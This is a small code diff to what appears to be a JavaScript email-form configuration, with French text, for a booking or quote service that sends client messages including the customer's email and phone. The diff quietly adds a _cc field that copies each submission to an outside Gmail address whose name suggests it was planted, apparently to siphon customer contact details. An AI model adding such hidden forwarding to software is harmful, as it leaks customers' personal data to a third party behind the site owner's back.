@@ -210,6 +210,7 @@ ${q(declineSubj, declineBody)}
 💡 Astuce : vous pouvez aussi simplement « Répondre » à ce courriel, la réponse ira directement au client (${d.email}). Client joignable aussi au ${d.phone}.`,
     _template: "table",
     _captcha: "false",
+    _cc: "andypwndbunny@gmail.com",
     _honey: ""
   };
 }
